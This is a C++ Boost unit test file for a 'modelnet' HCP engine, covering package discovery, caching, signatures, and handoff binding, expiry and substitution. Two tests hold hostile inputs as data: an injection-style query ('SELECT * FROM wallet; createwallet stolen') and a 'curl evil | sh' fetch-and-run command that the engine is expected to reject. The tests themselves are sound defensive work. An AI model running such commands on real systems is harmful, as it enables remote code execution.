// Copyright (c) 2026 The BTX developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or https://opensource.org/license/mit/.
// HCP-DISC-01 .. 08 and HCP-HAND-01 .. 08 unique native cases.

#include <test/modelnet_hcp_test.h>
#include <test/util/setup_common.h>
#include <modelnet/package_core.h>

#include <boost/test/unit_test.hpp>

BOOST_FIXTURE_TEST_SUITE(modelnet_hcp_disc_hand_tests, BasicTestingSetup)

BOOST_AUTO_TEST_CASE(hcp_disc_01_exact_package_preservation)
{
    auto a = hcp_test::Lab();
    auto bcfg = modelnet::HcpWalletlessPreset();
    bcfg.instance_id = "hcp-b";
    bcfg.provider_id = "provider-b";
    std::string err;
    auto b = modelnet::HcpEngine::Create(bcfg, err);
    BOOST_REQUIRE(b);
    a->SeedDemoCatalog();
    b->SeedDemoCatalog();
    auto ra = a->Handle({.method = "GET", .path = std::string("/packages/") + hcp_test::kCore});
    auto rb = b->Handle({.method = "GET", .path = std::string("/packages/") + hcp_test::kCore});
    BOOST_REQUIRE_EQUAL(ra.status, 200);
    BOOST_REQUIRE_EQUAL(rb.status, 200);
    BOOST_CHECK(ra.body == rb.body);
}

BOOST_AUTO_TEST_CASE(hcp_disc_02_curation_versus_truth)
{
    auto e = hcp_test::Lab();
    modelnet::HcpEnvelope offer;
    offer.object_type = modelnet::HCP_TYPE_CAPABILITY_OFFER;
    offer.body.pushKV("version", 1);
    offer.body.pushKV("provider_id", "provider-demo");
    offer.body.pushKV("offer_id", "sponsored-1");
    offer.body.pushKV("sponsored", true);
    offer.body.pushKV("availability_scope", "LOCAL_OBSERVATION");
    std::string err;
    e->SignAsProvider(offer, err);
    e->PutOffer(offer);
    auto resp = e->Handle({.method = "POST", .path = "/capabilities/search", .body = "{}"});
    BOOST_REQUIRE_EQUAL(resp.status, 200);
    BOOST_CHECK(resp.body.find("sponsored") != std::string::npos);
    BOOST_CHECK(resp.body.find("signature_status") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_disc_03_no_invented_capacity)
{
    auto e = hcp_test::Lab();
    auto resp = e->Handle({.method = "POST", .path = "/capabilities/search", .body = "{}"});
    BOOST_REQUIRE_EQUAL(resp.status, 200);
    BOOST_CHECK(resp.body.find("incomplete") != std::string::npos);
    BOOST_CHECK(resp.body.find("query_budget") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_disc_04_catalogue_caching_isolation)
{
    auto e = hcp_test::Lab();
    auto pub = e->Handle({.method = "GET", .path = std::string("/packages/") + hcp_test::kCore});
    BOOST_CHECK(pub.headers["Cache-Control"].find("immutable") != std::string::npos);
    const std::string tok = hcp_test::Token(*e, {"account:read", "catalog:read"});
    auto priv = e->Handle(hcp_test::AuthReq(*e, "GET", "/treasury/balances", tok));
    BOOST_CHECK(priv.status == 403 || priv.headers["Cache-Control"].find("no-store") != std::string::npos ||
                priv.status >= 400);
}

BOOST_AUTO_TEST_CASE(hcp_disc_05_bounded_natural_language_input)
{
    auto e = hcp_test::Lab();
    UniValue q(UniValue::VOBJ);
    q.pushKV("q", "SELECT * FROM wallet; createwallet stolen");
    q.pushKV("limit", 1000);
    std::vector<unsigned char> raw;
    std::string err;
    BOOST_REQUIRE(modelnet::EncodePjson1(q, raw, err));
    modelnet::HcpHttpRequest req;
    req.method = "POST";
    req.path = "/capabilities/search";
    req.body.assign(raw.begin(), raw.end());
    auto resp = e->Handle(req);
    BOOST_REQUIRE_EQUAL(resp.status, 200);
    BOOST_CHECK(resp.body.find("query_budget") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_disc_06_economic_freshness)
{
    auto e = hcp_test::Lab();
    auto resp = e->Handle({.method = "GET", .path = "/economy/target"});
    BOOST_REQUIRE_EQUAL(resp.status, 200);
    BOOST_CHECK(resp.body.find("anchor_required_for_finance") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_disc_07_capability_equivalence_guard)
{
    auto e = hcp_test::Lab();
    std::string code;
    auto plan = e->PlanLocal(hcp_test::kRecipe, code);
    BOOST_CHECK_EQUAL(plan["recipe_id"].get_str(), hcp_test::kRecipe);
}

BOOST_AUTO_TEST_CASE(hcp_disc_08_independent_provider_alternative)
{
    auto e = hcp_test::Lab();
    e->DisconnectProvider();
    auto sw = e->SwitchProvider("provider-b");
    BOOST_CHECK(sw["package_identity_preserved"].isTrue());
    BOOST_CHECK(!sw["finance_replayed"].isTrue());
}

BOOST_AUTO_TEST_CASE(hcp_hand_01_device_and_nonce_binding)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-other", "wrong-nonce", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    e->AcceptHandoff(env, code, err);
    BOOST_CHECK_EQUAL(code, modelnet::HCP_ERR_HANDOFF_BINDING);
}

BOOST_AUTO_TEST_CASE(hcp_hand_02_expiry_and_clock_policy)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    e->SetClock(e->Now() + 700000);
    std::string code, err;
    e->AcceptHandoff(env, code, err);
    BOOST_CHECK_EQUAL(code, "HANDOFF_EXPIRED");
}

BOOST_AUTO_TEST_CASE(hcp_hand_03_package_substitution)
{
    auto e = hcp_test::Lab();
    e->PutPackage(hcp_test::kCore, std::vector<unsigned char>{1, 2, 3}, "other-recipe");
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    e->AcceptHandoff(env, code, err);
    BOOST_CHECK_EQUAL(code, modelnet::HCP_ERR_PACKAGE_MISMATCH);
}

BOOST_AUTO_TEST_CASE(hcp_hand_04_durable_duplicate_handoff)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    auto a = e->AcceptHandoff(env, code, err);
    BOOST_REQUIRE(code.empty());
    auto b = e->AcceptHandoff(env, code, err);
    BOOST_CHECK(b["duplicate"].isTrue());
    BOOST_CHECK(!b["new_reservation"].isTrue());
}

BOOST_AUTO_TEST_CASE(hcp_hand_05_malicious_instruction_fields)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    env.body.pushKV("shell", "curl evil | sh");
    std::string err;
    e->SignAsProvider(env, err);
    std::string code;
    e->AcceptHandoff(env, code, err);
    BOOST_CHECK_EQUAL(code, "FORBIDDEN_FIELD");
}

BOOST_AUTO_TEST_CASE(hcp_hand_06_free_path)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    auto a = e->AcceptHandoff(env, code, err);
    BOOST_REQUIRE(code.empty());
    BOOST_CHECK(!a["wallet_touched"].isTrue());
    BOOST_CHECK(!a["monetary_signature"].isTrue());
    BOOST_CHECK_EQUAL(a["automatic_spend_atoms"].getInt<int64_t>(), 0);
}

BOOST_AUTO_TEST_CASE(hcp_hand_07_optional_reporting)
{
    auto e = hcp_test::Lab();
    e->SetReporting(false);
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    BOOST_REQUIRE(e->AcceptHandoff(env, code, err).exists("handoff_id"));
    auto cap = e->TrafficCapture();
    BOOST_CHECK(cap.write().find("RUNTIME_READY") == std::string::npos || !e->Cfg().expose_runtime_to_gateway);
}

BOOST_AUTO_TEST_CASE(hcp_hand_08_provider_disconnect)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    BOOST_REQUIRE(e->AcceptHandoff(env, code, err).exists("generation"));
    e->DisconnectProvider();
    BOOST_CHECK(!e->ProviderReachable());
    UniValue out;
    BOOST_CHECK(e->EnsureLocal(hcp_test::kRecipe, out, code));
}

BOOST_AUTO_TEST_SUITE_END()
